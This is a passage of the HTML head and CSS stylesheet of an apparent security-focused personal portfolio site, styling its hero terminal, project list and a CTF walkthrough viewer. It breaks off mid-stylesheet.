<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Matthew Vaishnav</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;1,9..40,300&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
  :root {
    --bg:          #07080e;
    --surface:     #0c0d16;
    --surface2:    #111320;
    --surface3:    #161828;
    --border:      rgba(255,255,255,0.065);
    --border-hi:   rgba(255,255,255,0.13);
    --accent:      #c8d6f8;
    --accent2:     #f5c842;
    --accent3:     #52c97a;
    --accent-dim:  rgba(200,214,248,0.45);
    --accent-glow: rgba(200,214,248,0.06);
    --text:        #6e7890;
    --text-mid:    #a0a8be;
    --text-hi:     #e8ecf8;
    --green:       #52c97a;
    --amber:       #f5c842;
    --red:         #e05252;
    --mono: 'JetBrains Mono', monospace;
    --sans: 'DM Sans', sans-serif;
    --display: 'Space Grotesk', sans-serif;
    --ease-out: cubic-bezier(.16,1,.3,1);
  }

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  html { scroll-behavior: smooth; background: var(--bg); }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: var(--sans);
    font-size: 17px;
    line-height: 1.6;
    -webkit-font-smoothing: antialiased;
    padding-top: 58px;
  }

  /* ── GLOBAL AMBIENT MESH ── */
  body::before {
    content: '';
    position: fixed; inset: 0; pointer-events: none; z-index: 0;
    background:
      radial-gradient(ellipse 80% 60% at 20% 10%, rgba(74,100,220,0.045) 0%, transparent 60%),
      radial-gradient(ellipse 50% 40% at 85% 80%, rgba(200,214,248,0.025) 0%, transparent 55%),
      radial-gradient(ellipse 40% 50% at 60% 40%, rgba(82,201,122,0.015) 0%, transparent 50%);
  }

  /* grain */
  #grain {
    position: fixed;
    inset: 0;
    pointer-events: none;
    z-index: 9998;
    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='300'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='300' height='300' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
    opacity: 0.45;
    mix-blend-mode: overlay;
  }

  /* ── SCROLL REVEAL ── */
  .reveal {
    opacity: 0;
    transform: translateY(22px);
    filter: blur(2px);
    transition: opacity .7s var(--ease-out), transform .7s var(--ease-out), filter .6s var(--ease-out);
  }
  .reveal.in {
    opacity: 1;
    transform: translateY(0);
    filter: blur(0);
  }

  /* ── NAV ── */
  #mainnav {
    position: fixed; top: 0; left: 0; right: 0; z-index: 200;
    display: flex; align-items: center; justify-content: space-between;
    padding: 0 2.5rem; height: 58px;
    border-bottom: 1px solid rgba(255,255,255,0.05);
    background: rgba(7,8,14,0.85);
    backdrop-filter: blur(20px) saturate(1.4);
    -webkit-backdrop-filter: blur(20px) saturate(1.4);
  }
  #mainnav::after {
    content: '';
    position: absolute; bottom: 0; left: 0; right: 0; height: 1px;
    background: linear-gradient(90deg, transparent, rgba(200,214,248,0.1), transparent);
    pointer-events: none;
  }

  /* hamburger */
  .nav-burger {
    display: none;
    flex-direction: column; justify-content: center; gap: 5px;
    width: 36px; height: 36px; cursor: pointer;
    background: none; border: none; padding: 6px;
  }
  .nav-burger span {
    display: block; width: 20px; height: 1.5px;
    background: var(--text-mid); border-radius: 2px;
    transition: all .2s ease;
  }
  .nav-burger.open span:nth-child(1) { transform: translateY(6.5px) rotate(45deg); }
  .nav-burger.open span:nth-child(2) { opacity: 0; }
  .nav-burger.open span:nth-child(3) { transform: translateY(-6.5px) rotate(-45deg); }

  /* mobile drawer */
  .nav-drawer {
    display: none;
    position: fixed; top: 58px; left: 0; right: 0;
    background: rgba(9,9,15,0.97);
    backdrop-filter: blur(20px);
    border-bottom: 1px solid var(--border);
    padding: 1.5rem 2rem;
    z-index: 199;
    flex-direction: column; gap: 0;
  }
  .nav-drawer.open { display: flex; }
  .nav-drawer a {
    display: block; padding: .85rem 0;
    font-size: 15px; color: var(--text-mid);
    text-decoration: none; border-bottom: 1px solid var(--border);
    transition: color .15s;
  }
  .nav-drawer a:last-child { border-bottom: none; }
  .nav-drawer a:hover { color: var(--text-hi); }
  .nav-name {
    font-family: var(--display);
    font-size: 15px; font-weight: 600;
    color: var(--text-hi); text-decoration: none;
    letter-spacing: 0.01em;
  }
  .nav-links { display: flex; gap: 2.5rem; list-style: none; }
  .nav-links a {
    font-size: 14px; color: var(--text);
    text-decoration: none; transition: color 0.15s;
  }
  .nav-links a:hover { color: var(--text-hi); }
  .nav-cta {
    font-size: 13px; font-weight: 500;
    color: var(--accent); text-decoration: none;
    padding: 6px 16px;
    border: 1px solid rgba(200,214,248,0.18);
    border-radius: 4px;
    transition: background 0.15s, border-color 0.15s;
  }
  .nav-cta:hover {
    background: var(--accent-glow);
    border-color: rgba(200,214,248,0.32);
  }

  /* ── HERO ── */
  #hero {
    min-height: calc(100vh - 58px);
    display: flex; align-items: center;
    padding: 4rem 2.5rem;
    position: relative;
    background: var(--bg);
    overflow: hidden;
  }
  /* Large ambient light source top-left */
  #hero::before {
    content: '';
    position: absolute; top: -10%; left: -8%;
    width: 65%; height: 90%;
    background: radial-gradient(ellipse at 30% 30%,
      rgba(74,100,220,0.08) 0%,
      rgba(200,214,248,0.03) 40%,
      transparent 70%);
    pointer-events: none;
  }
  /* Bottom fade into next section */
  #hero::after {
    content: '';
    position: absolute; bottom: 0; left: 0; right: 0; height: 120px;
    background: linear-gradient(to bottom, transparent, var(--surface));
    pointer-events: none;
  }

  /* Eyebrow availability line */
  .hero-eyebrow {
    display: flex; align-items: center; gap: 9px;
    margin-bottom: 1.75rem;
    opacity: 0; animation: up .6s var(--ease-out) .05s forwards;
  }
  .hero-eyebrow-dot {
    width: 7px; height: 7px; border-radius: 50%;
    background: var(--green); box-shadow: 0 0 10px var(--green), 0 0 20px rgba(82,201,122,0.3);
    flex-shrink: 0; animation: blink 2s step-end infinite;
  }
  .hero-eyebrow span:last-child {
    font-family: var(--mono); font-size: 13px;
    letter-spacing: .08em; text-transform: uppercase;
    color: var(--green); opacity: .9;
  }
  .hero-inner {
    width: 100%; max-width: 1120px; margin: 0 auto;
    display: grid; grid-template-columns: 1fr 1px 1fr;
    gap: 0; align-items: stretch;
    position: relative;
  }

  .hero-divider {
    width: 1px;
    height: 65%;
    background: linear-gradient(
      to bottom,
      transparent 0%,
      rgba(200,214,248,0.2) 20%,
      rgba(200,214,248,0.2) 80%,
      transparent 100%
    );
    justify-self: center;
    opacity: 0;
    animation: up .65s var(--ease-out) .55s forwards;
  }

  .hero-left {
    padding-right: 5rem;
    display: flex; flex-direction: column; justify-content: center;
  }
  .hero-right {
    padding-left: 5rem;
    display: flex; flex-direction: column;
    justify-content: center;
    padding-top: 3rem;
    padding-bottom: 3rem;
  }

  h1 {
    font-family: var(--display);
    font-size: clamp(3rem, 5.5vw, 5.2rem);
    font-weight: 700;
    line-height: 1.04; letter-spacing: -.03em;
    color: var(--text-hi);
    opacity: 0; animation: up .7s var(--ease-out) .18s forwards;
  }

  /* ── GLITCH EFFECT ── */
  .glitch-wrap { position: relative; display: inline-block; }
  .glitch-wrap::before,
  .glitch-wrap::after {
    content: attr(data-text);
    position: absolute; top: 0; left: 0;
    width: 100%; height: 100%;
    font-family: var(--display); font-size: inherit; font-weight: 700;
    line-height: inherit; letter-spacing: inherit;
    pointer-events: none;
    opacity: 0;
  }
  .glitch-wrap::before {
    color: #52c97a; clip: rect(0, 900px, 0, 0);
    animation: glitch-1 4s infinite linear alternate-reverse;
  }
  .glitch-wrap::after {
    color: #c8d6f8; clip: rect(0, 900px, 0, 0);
    animation: glitch-2 4s infinite linear alternate-reverse;
  }
  @keyframes glitch-1 {
    0%,89%,100% { opacity: 0; clip: rect(0,0,0,0); transform: none; }
    90% { opacity: 0.5; clip: rect(10px, 900px, 30px, 0); transform: translate(-3px, 0); }
    92% { clip: rect(50px, 900px, 70px, 0); transform: translate(2px, 0); }
    94% { clip: rect(20px, 900px, 40px, 0); transform: translate(-2px, 0); }
    96% { opacity: 0; }
  }
  @keyframes glitch-2 {
    0%,91%,100% { opacity: 0; clip: rect(0,0,0,0); transform: none; }
    92% { opacity: 0.4; clip: rect(40px, 900px, 60px, 0); transform: translate(3px, 0); }
    94% { clip: rect(15px, 900px, 35px, 0); transform: translate(-3px, 0); }
    96% { opacity: 0; }
  }
  h1 .name-first {
    display: block; font-weight: 400; font-style: normal;
    font-size: 0.38em; color: var(--text-mid); letter-spacing: .15em;
    text-transform: uppercase; margin-bottom: .5em;
    opacity: 0.7;
  }
  h1 em {
    font-style: italic; font-weight: 300;
    background: linear-gradient(135deg, var(--accent) 0%, rgba(200,214,248,0.5) 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    display: inline;
  }
  h1 .name-role { display: none; }

  .hero-body {
    margin-top: 1.75rem;
    font-size: 1.05rem; font-weight: 300;
    color: var(--text); line-height: 1.85;
    opacity: 0; animation: up .65s var(--ease-out) .32s forwards;
    max-width: 400px;
  }
  .hero-body strong { color: var(--accent); font-weight: 500; }

  .hero-actions {
    display: flex; gap: 1rem; flex-wrap: wrap;
    margin-top: 2.5rem;
    opacity: 0; animation: up .65s var(--ease-out) .44s forwards;
  }

  /* ── HERO STATS — HUD STYLE ── */
  .hero-stats {
    display: flex; align-items: stretch; gap: 0;
    margin-top: 2.5rem;
    opacity: 0; animation: up .65s var(--ease-out) .56s forwards;
    border: 1px solid rgba(200,214,248,0.1);
    border-radius: 8px;
    overflow: hidden; max-width: 420px;
    background: rgba(200,214,248,0.02);
    position: relative;
  }
  /* animated top border */
  .hero-stats::before {
    content: '';
    position: absolute; top: 0; left: 0; right: 0; height: 1px;
    background: linear-gradient(90deg, transparent, rgba(200,214,248,0.3), rgba(245,200,66,0.3), transparent);
    animation: shimmer 3s linear infinite;
    background-size: 200% 100%;
  }
  .hero-stat {
    flex: 1; padding: .85rem .75rem; text-align: center;
    transition: background .2s;
    position: relative;
  }
  .hero-stat:hover { background: rgba(200,214,248,0.04); }
  .hero-stat-num {
    display: block;
    font-family: var(--display); font-size: 1.45rem; font-weight: 700;
    color: var(--text-hi); letter-spacing: -.03em; line-height: 1;
    margin-bottom: .3rem;
  }
  .hero-stat-label {
    display: block;
    font-family: var(--mono); font-size: 10px; letter-spacing: .08em;
    text-transform: uppercase; color: var(--text-mid); line-height: 1.4;
  }
  .hero-stat-divider {
    width: 1px; background: rgba(255,255,255,0.06); flex-shrink: 0; align-self: stretch;
  }
  .btn {
    display: inline-flex; align-items: center; gap: 8px;
    padding: 12px 26px;
    font-family: var(--sans); font-size: 14px; font-weight: 500;
    text-decoration: none; border-radius: 6px;
    transition: all .2s var(--ease-out); letter-spacing: .01em;
  }
  .btn-solid {
    background: var(--text-hi); color: var(--bg);
    box-shadow: 0 0 0 0 rgba(200,214,248,0.3);
  }
  .btn-solid:hover {
    background: #fff;
    transform: translateY(-2px);
    box-shadow: 0 12px 32px rgba(200,214,248,0.15), 0 0 0 1px rgba(255,255,255,0.3);
  }
  .btn-ghost {
    background: transparent; color: var(--text-mid);
    border: 1px solid rgba(255,255,255,0.12);
  }
  .btn-ghost:hover {
    border-color: rgba(200,214,248,0.3);
    color: var(--text-hi);
    background: rgba(200,214,248,0.04);
    transform: translateY(-1px);
  }

  /* ── HERO TERMINAL ── */
  .hero-terminal {
    opacity: 0; animation: up .65s var(--ease-out) .5s forwards;
    border: 1px solid rgba(200,214,248,0.1);
    border-radius: 12px; overflow: hidden;
    background: #040609;
    box-shadow:
      0 48px 120px rgba(0,0,0,0.7),
      0 0 0 1px rgba(255,255,255,0.04),
      inset 0 1px 0 rgba(255,255,255,0.06),
      0 0 60px rgba(74,100,220,0.06);
    flex: 1;
    display: flex; flex-direction: column;
    position: relative;
  }
  /* scanline overlay */
  .hero-terminal::after {
    content: '';
    position: absolute; inset: 0; pointer-events: none;
    background: repeating-linear-gradient(
      to bottom,
      transparent 0px, transparent 3px,
      rgba(0,0,0,0.06) 3px, rgba(0,0,0,0.06) 4px
    );
    z-index: 10; border-radius: 12px;
  }
  /* amber top glow */
  .hero-terminal::before {
    content: '';
    position: absolute; top: 0; left: 20%; right: 20%; height: 1px;
    background: linear-gradient(90deg, transparent, rgba(200,214,248,0.2), transparent);
    z-index: 11;
  }
  .ht-bar {
    display: flex; align-items: center; gap: 7px;
    padding: 10px 14px; background: var(--surface2);
    border-bottom: 1px solid var(--border);
  }
  .ht-dot { width: 11px; height: 11px; border-radius: 50%; }
  .ht-red    { background: #ff5f57; }
  .ht-yellow { background: #febc2e; }
  .ht-green  { background: #28c840; }
  .ht-title {
    font-family: var(--mono); font-size: 11px;
    color: var(--text); margin-left: auto; letter-spacing: .04em;
  }
  .ht-body {
    padding: 1.25rem 1.5rem;
    font-family: var(--mono); font-size: 12px; line-height: 1.9;
    flex: 1; overflow: hidden;
  }
  .ht-line { display: flex; gap: 0; white-space: pre-wrap; word-break: break-all; }
  .ht-prompt { color: var(--accent); flex-shrink: 0; }
  .ht-cmd    { color: var(--text-hi); }
  .ht-out    { color: #4a5568; }
  .ht-hi     { color: var(--text-mid); }
  .ht-green-t { color: #52c97a; }
  .ht-amber-t { color: #f5c842; }
  .ht-red-t   { color: #e05252; }
  .ht-cursor  {
    display: inline-block; width: 7px; height: 14px;
    background: var(--accent); opacity: 0.7; margin-left: 2px;
    vertical-align: middle;
    animation: blink .9s step-end infinite;
  }

  .hero-scroll {
    position: absolute; bottom: 2.5rem; left: 0;
    display: flex; align-items: center; gap: 10px;
    opacity: 0; animation: up .65s cubic-bezier(.16,1,.3,1) .65s forwards;
  }
  .hero-scroll-line { width: 36px; height: 1px; background: var(--border-hi); }
  .hero-scroll span {
    font-family: var(--mono); font-size: 10px;
    letter-spacing: .12em; text-transform: uppercase; color: var(--text);
  }

  /* ── SECTIONS ── */
  section { padding: 7rem 2.5rem; position: relative; }
  .inner { max-width: 860px; margin: 0 auto; }

  .s-label {
    display: flex; align-items: center; gap: 1.5rem;
    margin-bottom: 4.5rem;
  }
  .s-label-txt {
    font-family: var(--mono); font-size: 12px;
    letter-spacing: .12em; text-transform: uppercase;
    color: var(--text-mid); white-space: nowrap; opacity: .8;
  }
  .s-label-line { flex: 1; height: 1px; background: var(--border); }

  h2 {
    font-family: var(--display);
    font-size: 2.2rem; font-weight: 700;
    letter-spacing: -.03em; color: var(--text-hi);
    margin-bottom: 1.25rem; line-height: 1.08;
  }

  /* ── ABOUT ── */
  #about {
    background: var(--surface);
    border-top: 1px solid var(--border);
  }
  /* subtle top light for section entry */
  #about::before {
    content: '';
    position: absolute; top: 0; left: 0; right: 0; height: 1px;
    background: linear-gradient(90deg, transparent, rgba(200,214,248,0.12), transparent);
  }

  .about-tagline {
    margin-bottom: 3.5rem;
  }
  .about-tagline p {
    font-family: var(--display);
    font-size: clamp(1.25rem, 2.2vw, 1.7rem);
    font-weight: 500;
    line-height: 1.4;
    color: var(--text-mid);
    letter-spacing: -.02em;
    max-width: 700px;
    border-left: 3px solid rgba(200,214,248,0.2);
    padding-left: 1.5rem;
  }

  .about-cols {
    display: grid; grid-template-columns: 1.25fr .75fr;
    gap: 5rem; align-items: start;
  }
  .about-text p {
    font-weight: 300; color: var(--text);
    line-height: 1.9; margin-bottom: 1.3rem;
    font-size: 1.04rem;
  }
  .about-text strong { color: var(--accent); font-weight: 500; }

  .profile-card {
    border: 1px solid rgba(200,214,248,0.08);
    border-radius: 10px; overflow: hidden;
    background: linear-gradient(160deg, rgba(200,214,248,0.03) 0%, transparent 60%);
    box-shadow: 0 24px 64px rgba(0,0,0,0.3);
  }
  .profile-head {
    padding: .9rem 1.25rem; border-bottom: 1px solid rgba(255,255,255,0.06);
    display: flex; align-items: center; gap: 8px;
    background: rgba(200,214,248,0.025);
  }
  .profile-head-dot {
    width: 7px; height: 7px; border-radius: 50%;
    background: var(--accent); box-shadow: 0 0 6px var(--accent);
    opacity: 0.6;
  }
  .profile-head span {
    font-family: var(--mono); font-size: 10px;
    letter-spacing: .14em; text-transform: uppercase; color: var(--text);
  }
  .profile-row {
    display: flex; justify-content: space-between; align-items: center;
    padding: .65rem 1.25rem; border-bottom: 1px solid rgba(255,255,255,0.045); gap: 1rem;
    transition: background .15s;
  }
  .profile-row:last-child { border-bottom: none; }
  .profile-row:hover { background: rgba(200,214,248,0.02); }
  .pk { font-family: var(--mono); font-size: 12px; color: var(--text-mid); opacity: .9; }
  .pv { font-family: var(--mono); font-size: 12px; color: var(--text-hi); text-align: right; }

  .sdot {
    display: inline-block; width: 6px; height: 6px;
    border-radius: 50%; margin-right: 5px; vertical-align: middle;
  }
  .s-green { background: var(--green); }
  .s-amber { background: var(--amber); animation: blink 2s ease-in-out infinite; }
  .s-dim   { background: #3a3f50; }
  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }

  /* ── SKILLS ── */
  #skills { background: var(--bg); border-top: 1px solid var(--border); }
  .skills-grid {
    display: grid; grid-template-columns: repeat(3,1fr);
    gap: 1px; background: var(--border);
    border: 1px solid var(--border); border-radius: 6px; overflow: hidden;
  }
  .sc {
    background: var(--bg); padding: 1.5rem;
    transition: background .15s;
  }
  .sc:hover { background: var(--surface2); }
  .sc-label {
    display: block; font-family: var(--mono); font-size: 11px;
    letter-spacing: .1em; text-transform: uppercase;
    color: var(--accent-dim); margin-bottom: .9rem;
  }
  .chips { display: flex; flex-wrap: wrap; gap: 5px; }
  .chip {
    font-family: var(--mono); font-size: 11px;
    padding: 4px 9px; border: 1px solid var(--border-hi);
    border-radius: 3px; color: var(--text); letter-spacing: .01em;
    transition: color .15s, border-color .15s;
  }
  .sc:hover .chip { color: var(--text-mid); border-color: rgba(255,255,255,.14); }

  /* ── PROJECTS ── */
  #projects {
    background: var(--bg);
    border-top: 1px solid var(--border);
  }
  #projects::before {
    content: '';
    position: absolute; top: 0; left: 0; right: 0; height: 200px;
    background: linear-gradient(to bottom, var(--surface), transparent);
    pointer-events: none;
  }

  .proj-intro {
    font-size: 15px; font-weight: 300; color: var(--text);
    line-height: 1.75; margin-bottom: 2rem; max-width: 540px;
  }
  .proj-intro strong { color: var(--text-mid); font-weight: 400; }

  .proj-row {
    display: grid; grid-template-columns: 1fr auto;
    gap: 2rem; align-items: start;
    padding: 2rem 0; border-bottom: 1px solid rgba(255,255,255,0.05);
    text-decoration: none; cursor: pointer;
    transition: padding-left .25s var(--ease-out);
    position: relative;
  }
  .proj-row:first-of-type { border-top: 1px solid rgba(255,255,255,0.05); }
  .proj-row::before {
    content: '';
    position: absolute; left: -2.5rem; top: 0; bottom: 0; width: 3px;
    background: linear-gradient(to bottom, transparent, var(--accent), transparent);
    opacity: 0;
    transition: opacity .3s;
  }
  .proj-row:hover { padding-left: .8rem; }
  .proj-row:hover::before { opacity: 0.6; }
  .proj-row:hover .proj-title { color: #fff; }

  .proj-kicker {
    font-family: var(--mono); font-size: 12px;
    letter-spacing: .08em; text-transform: uppercase;
    color: var(--text-mid); margin-bottom: .4rem; opacity: .85;
  }
  .proj-title {
    font-family: var(--display); font-size: 1.35rem; font-weight: 700;
    color: var(--text-hi); letter-spacing: -.025em;
    margin-bottom: .35rem; transition: color .2s;
  }
  .proj-impact {
    font-family: var(--mono); font-size: 12px;
    color: var(--text-mid); margin-bottom: .6rem; letter-spacing: .01em;
    display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
  }
  .proj-impact::before {
    content: '';
    display: inline-block; width: 14px; height: 1px;
    background: var(--accent2); opacity: 0.6; flex-shrink: 0;
  }
  .proj-metric {
    color: var(--accent2); font-weight: 600;
  }
  .proj-desc {
    font-size: 14px; font-weight: 300;
    color: var(--text); line-height: 1.75; max-width: 580px;
  }
  .proj-arrow {
    font-size: 18px; color: rgba(255,255,255,0.15);
    transition: color .2s, transform .25s var(--ease-out); flex-shrink: 0;
    margin-top: .35rem;
  }
  .proj-row:hover .proj-arrow { color: var(--text-mid); transform: translate(4px,-4px); }

  /* ── PLANNED / UPCOMING PROJECTS ── */
  .proj-row.planned {
    opacity: 0.55;
    position: relative;
  }
  .proj-row.planned:hover { opacity: 0.85; }
  .proj-row.planned .proj-title { color: var(--text-mid); }
  .proj-divider {
    display: flex; align-items: center; gap: 1.5rem;
    padding: 2.5rem 0 1rem;
  }
  .proj-divider-label {
    font-family: var(--mono); font-size: 11px;
    letter-spacing: .1em; text-transform: uppercase;
    color: var(--text-mid); opacity: .7; white-space: nowrap;
  }
  .proj-divider-line { flex: 1; height: 1px; background: var(--border); }
  .proj-status-tag {
    display: inline-flex; align-items: center; gap: 5px;
    font-family: var(--mono); font-size: 9px;
    letter-spacing: .1em; text-transform: uppercase;
    padding: 3px 8px; border-radius: 3px; margin-bottom: .5rem;
  }
  .proj-status-tag.planned {
    color: var(--amber);
    background: rgba(245,200,66,.07);
    border: 1px solid rgba(245,200,66,.2);
  }
  .proj-status-tag.planned::before {
    content: '';
    width: 5px; height: 5px; border-radius: 50%;
    background: var(--amber);
    animation: blink 2s step-end infinite;
    flex-shrink: 0;
  }
  .proj-status-tag.inprogress {
    color: #6a9aff;
    background: rgba(106,154,255,.07);
    border: 1px solid rgba(106,154,255,.2);
  }
  .proj-status-tag.inprogress::before {
    content: '';
    width: 5px; height: 5px; border-radius: 50%;
    background: #6a9aff;
    animation: blink 1.5s step-end infinite;
    flex-shrink: 0;
  }
  .proj-eta {
    font-family: var(--mono); font-size: 11px;
    color: var(--text-mid); opacity: .65; margin-top: .4rem;
    letter-spacing: .04em;
  }

  /* ── CTF ── */
  #ctf { background: var(--surface); border-top: 1px solid var(--border); }

  .ctf-tabs { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:2rem; }
  .ctf-tab {
    font-family:var(--mono); font-size:11px; letter-spacing:.08em;
    padding:7px 16px; border-radius:5px; cursor:pointer;
    border:1px solid rgba(255,255,255,0.07); background:rgba(255,255,255,0.02);
    color:var(--text-mid); transition:all .18s var(--ease-out);
    display:flex; align-items:center; gap:8px; user-select:none;
  }
  .ctf-tab:hover { border-color:rgba(200,214,248,0.2); color:var(--text-hi); }
  .ctf-tab.active {
    border-color:rgba(200,214,248,0.35); background:rgba(200,214,248,0.06);
    color:var(--text-hi); box-shadow:0 0 16px rgba(200,214,248,0.05);
  }
  .ctf-tab-diff { font-size:9px; padding:1px 6px; border-radius:3px; letter-spacing:.05em; }
  .tab-easy { color:var(--green); background:rgba(82,201,122,.1); border:1px solid rgba(82,201,122,.2); }
  .tab-med  { color:var(--amber); background:rgba(245,200,66,.1);  border:1px solid rgba(245,200,66,.2); }
  .tab-hard { color:var(--red);   background:rgba(224,82,82,.1);   border:1px solid rgba(224,82,82,.2);  }

  .ctf-player {
    border:1px solid rgba(200,214,248,0.09); border-radius:14px; overflow:hidden;
    background:#020408;
    box-shadow:0 32px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.04);
    position:relative;
  }
  .ctf-player::before {
    content:''; position:absolute; top:0; left:0; right:0; height:1px;
    background:linear-gradient(90deg,transparent,rgba(200,214,248,0.15),transparent);
  }
  .ctf-player-header {
    padding:1.25rem 1.75rem; border-bottom:1px solid rgba(255,255,255,0.05);
    background:rgba(255,255,255,0.02);
    display:flex; align-items:flex-start; justify-content:space-between; gap:2rem;
  }
  .ctf-player-meta { flex:1; }
  .ctf-player-platform {
    font-family:var(--mono); font-size:10px; letter-spacing:.14em; text-transform:uppercase;
    color:var(--text-mid); opacity:.7; margin-bottom:.4rem;
  }
  .ctf-player-title {
    font-family:var(--display); font-size:1.3rem; font-weight:700;
    color:var(--text-hi); letter-spacing:-.02em; margin-bottom:.5rem;
  }
  .ctf-player-desc {
    font-size:13px; font-weight:300; color:var(--text); line-height:1.7; max-width:520px;
  }
  .ctf-player-stats { display:flex; flex-direction:column; align-items:flex-end; gap:6px; flex-shrink:0; }
  .ctf-stat-badge {
    font-family:var(--mono); font-size:10px; letter-spacing:.07em;
    padding:4px 12px; border-radius:4px; white-space:nowrap;
  }

  .ctf-chain-rail {
    padding:1rem 1.75rem; border-bottom:1px solid rgba(255,255,255,0.04);
    display:flex; align-items:center; gap:0; background:rgba(0,0,0,0.2); overflow-x:auto;
  }
  .ctf-phase-btn { display:flex; align-items:center; gap:0; cursor:pointer; flex-shrink:0; }
  .ctf-phase-pip {
    display:flex; align-items:center; gap:8px; padding:5px 14px; border-radius:4px;
    font-family:var(--mono); font-size:10px; letter-spacing:.09em;
    color:rgba(255,255,255,0.2); border:1px solid rgba(255,255,255,0.06);
    background:rgba(255,255,255,0.02); transition:all .2s var(--ease-out); user-select:none;
  }
  .ctf-phase-pip .phase-dot {
    width:5px; height:5px; border-radius:50%; background:currentColor; opacity:.4;
    flex-shrink:0; transition:opacity .2s, box-shadow .2s;
  }
  .ctf-phase-btn.done .ctf-phase-pip { color:rgba(255,255,255,0.45); border-color:rgba(255,255,255,0.1); }
  .ctf-phase-btn.done .phase-dot { opacity:.8; }
  .ctf-phase-btn.active .ctf-phase-pip {
    color:var(--phase-color); border-color:color-mix(in srgb,var(--phase-color) 40%,transparent);
    background:color-mix(in srgb,var(--phase-color) 8%,transparent);
    box-shadow:0 0 14px color-mix(in srgb,var(--phase-color) 12%,transparent);
  }
  .ctf-phase-btn.active .phase-dot { opacity:1; box-shadow:0 0 6px var(--phase-color); background:var(--phase-color); }
  .ctf-phase-conn { width:28px; height:1px; flex-shrink:0; background:rgba(255,255,255,0.06); }
  .ctf-phase-conn.done { background:rgba(255,255,255,0.18); }

  .ctf-player-body { display:grid; grid-template-columns:1fr 1fr; min-height:320px; }
  .ctf-log-pane { border-right:1px solid rgba(255,255,255,0.04); display:flex; flex-direction:column; }
  .ctf-log-bar {
    padding:.6rem 1.25rem; border-bottom:1px solid rgba(255,255,255,0.04);
    font-family:var(--mono); font-size:9px; letter-spacing:.12em; text-transform:uppercase;
    color:rgba(255,255,255,0.2); background:rgba(255,255,255,0.01);
    display:flex; align-items:center; gap:8px;
  }
  .ctf-log-bar::before {
    content:''; width:6px; height:6px; border-radius:50%;
    background:var(--phase-color,#888); box-shadow:0 0 6px var(--phase-color,#888);
  }
  .ctf-log-output {
    padding:1.1rem 1.25rem; font-family:var(--mono); font-size:11.5px; line-height:1.85;
    flex:1; overflow-y:auto; min-height:0;
  }
  .ctf-log-line {
    display:block; white-space:pre-wrap; word-break:break-all;
    opacity:0; transform:translateY(4px);
    animation:log-in .3s var(--ease-out) forwards;
  }
  @keyframes log-in { to { opacity:1; transform:none; } }
  .log-prompt { color:#6a9aff; }
  .log-cmd    { color:#c8d6f8; }
  .log-out    { color:#4a5568; }
  .log-hit    { color:#f5c842; }
  .log-owned  { color:#52c97a; }
  .log-warn   { color:#e05252; }

  .ctf-analysis-pane { display:flex; flex-direction:column; }
  .ctf-analysis-bar {
    padding:.6rem 1.25rem; border-bottom:1px solid rgba(255,255,255,0.04);
    font-family:var(--mono); font-size:9px; letter-spacing:.12em; text-transform:uppercase;
    color:rgba(255,255,255,0.2); background:rgba(255,255,255,0.01);
  }
  .ctf-analysis-body {
    padding:1.1rem 1.25rem; flex:1; overflow-y:auto;
    display:flex; flex-direction:column; gap:1rem;
  }
  .analysis-block {
    border:1px solid rgba(255,255,255,0.06); border-radius:7px; overflow:hidden;
    opacity:0; transform:translateY(6px);
    animation:log-in .4s var(--ease-out) .12s forwards;
  }
  .analysis-block-header {
    padding:.5rem 1rem; font-family:var(--mono); font-size:9px; letter-spacing:.12em;
    text-transform:uppercase; background:rgba(255,255,255,0.03);
    border-bottom:1px solid rgba(255,255,255,0.05);
    display:flex; align-items:center; gap:7px;
  }
  .analysis-block-body { padding:.7rem 1rem; font-family:var(--mono); font-size:11px; line-height:1.75; }
  .attack-chip {
    display:inline-flex; align-items:center; gap:5px; padding:3px 10px; border-radius:3px;
    font-family:var(--mono); font-size:10px; letter-spacing:.06em;
    background:rgba(106,154,255,0.1); border:1px solid rgba(106,154,255,0.25);
    color:#6a9aff; margin:2px;
  }
  .sigma-key   { color:#6a9aff; }
  .sigma-val   { color:#c8d6f8; }
  .sigma-green { color:#52c97a; }
  .sigma-amber { color:#f5c842; }
  .sigma-red   { color:#e05252; }
  .sigma-dim   { color:#4a5568; }
  .det-line { color:#52c97a; }

  .ctf-controls {
    padding:.85rem 1.75rem; border-top:1px solid rgba(255,255,255,0.04);
    display:flex; align-items:center; gap:.75rem; background:rgba(0,0,0,0.15);
  }
  .ctf-ctrl-btn {
    font-family:var(--mono); font-size:10px; letter-spacing:.08em;
    padding:5px 14px; border-radius:4px; cursor:pointer;
    border:1px solid rgba(255,255,255,0.09); background:rgba(255,255,255,0.03);
    color:var(--text-mid); transition:all .15s;
  }
  .ctf-ctrl-btn:hover { border-color:rgba(200,214,248,0.25); color:var(--text-hi); background:rgba(200,214,248,0.05); }
  .ctf-ctrl-btn.primary { border-color:rgba(200,214,248,0.25); color:#c8d6f8; background:rgba(200,214,248,0.06); }
  .ctf-ctrl-btn.primary:hover { background:rgba(200,214,248,0.1); }
  .ctf-ctrl-sep { flex:1; }
  .ctf-phase-counter { font-family:var(--mono); font-size:10px; letter-spacing:.08em; color:rgba(255,255,255,0.2); }
  .ctf-github-link {
    font-family:var(--mono); font-size:10px; letter-spacing:.08em; color:var(--text-mid);
    text-decoration:none; padding:5px 14px; border-radius:4px;
    border:1px solid rgba(255,255,255,0.09); background:rgba(255,255,255,0.02);
